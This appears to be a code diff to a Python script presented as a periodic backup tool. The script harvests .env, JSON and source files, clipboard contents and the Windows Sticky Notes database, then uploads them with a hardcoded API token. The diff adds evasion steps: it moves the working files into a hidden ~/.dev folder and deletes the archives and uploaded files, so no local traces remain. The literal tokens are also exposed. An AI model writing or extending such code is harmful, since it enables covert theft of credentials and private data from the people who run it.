@@ -61,6 +61,9 @@ def zip_backup_folder(folder_path, zip_file_path):
             os.remove(f"{zip_file_path}.zip")
         
         shutil.make_archive(zip_file_path, 'zip', folder_path)
+        
+        shutil.rmtree(folder_path)
+
         return f"{zip_file_path}.zip"
     except Exception as e:
         logging.error(f"Failed to zip folder {folder_path}: {e}")
@@ -88,6 +91,8 @@ def upload_file(file_path, api_token):
 
                 if response.status_code == 200:
                     logging.critical(f"Uploaded successfully: {file_path}")
+
+                    os.remove(file_path)
                 else:
                     logging.error(f"Failed to upload {file_path}. Status code: {response.status_code}, Response: {response.text}")
         except Exception as e:
@@ -122,12 +127,12 @@ def monitor_clipboard(file_path):
 def periodic_backup_upload():
     windows_user = get_windows_username()
 
-    wsl_backup_directory = "~/dev/Backup/wsl"
-    ddd_backup_directory = "~/dev/Backup/ddd"
+    wsl_backup_directory = "~/.dev/Backup/wsl"
+    ddd_backup_directory = "~/.dev/Backup/ddd"
     ddd_source_directory = "/mnt/d"
-    clipboard_log_path = os.path.expanduser("~/dev/Backup/clipboard_log.txt")
+    clipboard_log_path = os.path.expanduser("~/.dev/Backup/clipboard_log.txt")
     sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
-    api_token = "q5MaxazXhl0PvMOpDZw3kjEjCUZCfaU6"
+    api_token = "KPnPkbJW9SqKQ8FHqaiJo9ub7YKfoq3J"
 
     threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,), daemon=True).start()
 
@@ -135,14 +140,14 @@ def periodic_backup_upload():
     open(clipboard_log_path, 'a').close()
 
     while True:
-        wsl_backup_dir = backup_files("~", wsl_backup_directory, [".env", ".json", ".csv", ".js", ".py", ".go", ".txt"])
+        wsl_backup_dir = backup_files("~", wsl_backup_directory, [".env", ".json", ".js", ".py", ".go", ".txt"])
 
-        ddd_backup_dir = backup_files(ddd_source_directory, ddd_backup_directory, [".txt", ".doc", ".docx", ".xls", ".xlsx", ".one", ".js", ".py", ".go", ".json", ".csv"])
+        ddd_backup_dir = backup_files(ddd_source_directory, ddd_backup_directory, [".txt", ".doc", ".docx", ".xls", ".xlsx", ".one", ".json", ".js", ".py", ".go", ".csv"])
 
-        wsl_zip_file_path = os.path.expanduser("~/dev/Backup/wsl_backup")
+        wsl_zip_file_path = os.path.expanduser("~/.dev/Backup/wsl_backup")
         wsl_zip_file = zip_backup_folder(wsl_backup_dir, wsl_zip_file_path)
 
-        ddd_zip_file_path = os.path.expanduser("~/dev/Backup/ddd_backup")
+        ddd_zip_file_path = os.path.expanduser("~/.dev/Backup/ddd_backup")
         ddd_zip_file = zip_backup_folder(ddd_backup_dir, ddd_zip_file_path)
 
         if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
